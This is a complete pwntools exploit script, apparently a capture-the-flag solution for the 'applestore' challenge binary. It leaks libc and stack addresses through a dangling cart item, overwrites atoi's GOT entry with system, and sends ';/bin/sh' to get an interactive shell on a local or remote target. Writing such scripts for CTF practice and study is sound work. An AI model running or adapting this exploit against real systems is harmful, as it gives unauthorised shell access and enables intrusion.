#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="i386", log_level="info")
local_elf  = "./applestore"
local_libc = "./libc_32.so.6"

def menu(idx):
    io.recvuntil("> ")
    io.sendline(str(idx))

def add(idx):
    menu(2)
    io.recvuntil("Device Number> ")
    io.sendline(str(idx))

def cart(msg = None):
    menu(4)
    io.recvuntil("ok? (y/n) > ")
    io.sendline(b"y\x00" + msg)

def checkout():
    menu(5)
    io.recvuntil("ok? (y/n) > ")
    io.sendline("y")

def leak(addr):
    cart(p32(addr) + p32(0) + p32(0) + p32(0))
    io.recvuntil("27: ")
    return u32(io.recv(4))

def exp():
    for i in range(6):
        add(1)
    for i in range(20):
        add(2)
    checkout()          # concat iphone 8

    # leak libc
    puts_addr = leak(elf.got["puts"])
    libc_base = puts_addr - libc.sym["puts"]

    # leak stack 1                bug on ubuntu 20.04 with pwntools 4.1.3 or pwntools 4.3.0.dev0
    #                             available on 16.04 with pwntools 4.2.0.dev0
    # addr = 0x804B068
    # for i in range(27):
    #     addr += 0x8
    #     addr = leak(addr)
    #     log.debug("%d addr: 0x%x" % (i, addr))
    # log.debug("iphone 8 addr: 0x%x" % addr)

    # leak stack 2
    libc_environ = libc_base + libc.sym["environ"]
    ebp = leak(libc_environ) - 0x104
    log.debug("ebp: 0x%x" % ebp)

    system_addr = libc_base + libc.sym["system"]
    log.debug("system addr: 0x%x" % system_addr)
    atoi_got = elf.got["atoi"]
    menu(3)
    io.recvuntil("Item Number> ")
    io.sendline(b"27" + p32(0x08048F4C) + p32(0xdeadbeef) + p32(atoi_got+0x22) + p32(ebp-0x8))
    io.recvuntil("> ")
    io.sendline(p32(system_addr) + b";/bin/sh")

    
    io.interactive()

argc = len(sys.argv)
if argc == 1:
    io = process(local_elf)
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elif argc > 1:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)
    libc = ELF(local_libc)

elf = ELF(local_elf)
exp()